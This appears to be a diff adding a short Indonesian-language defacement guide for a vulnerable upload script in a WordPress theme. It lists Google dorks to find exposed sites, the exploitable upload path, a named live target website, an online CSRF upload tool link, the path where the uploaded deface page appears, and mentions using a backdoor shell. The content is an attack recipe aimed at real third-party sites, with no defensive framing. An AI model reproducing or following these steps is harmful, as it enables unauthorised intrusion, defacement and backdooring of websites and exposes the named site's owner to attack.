@@ -1,0 +1,25 @@
+- Untuk bahan² nya Ada di bawah sini 🔓
+--------------------------------------------------------------------
+Bahan yang di butuhkan.
+- Komputer / Hp
+- Koneksi Internet/Wifi 
+- Script Deface
+- Shell Backdoor (Jika dibutuhkan)
+
+Drok:
+inurl:wp-content/themes/Ghost/
+inurl:wp-content/themes/Ghost/includes/
+inurl:wp-content/themes/Ghost/includes/uploadify/
+inurl:wp-content/themes/Ghost/includes/uploadify/upload_settings_image.php
+
+exploit:
+/wp-content/themes/Ghost/includes/uploadify/upload_settings_image.php
+
+Live Target
+https://www.juvankoski.com/wp-content/themes/Ghost/includes/uploadify/upload_settings_image.php
+
+Link csrf online:
+http://tools.cyberthroneindo.my.id/csrf.php
+
+Cara memanggil SC yg tadi udah di upload:
+https://website/wp-content/uploads/settingsimages/sclu.html
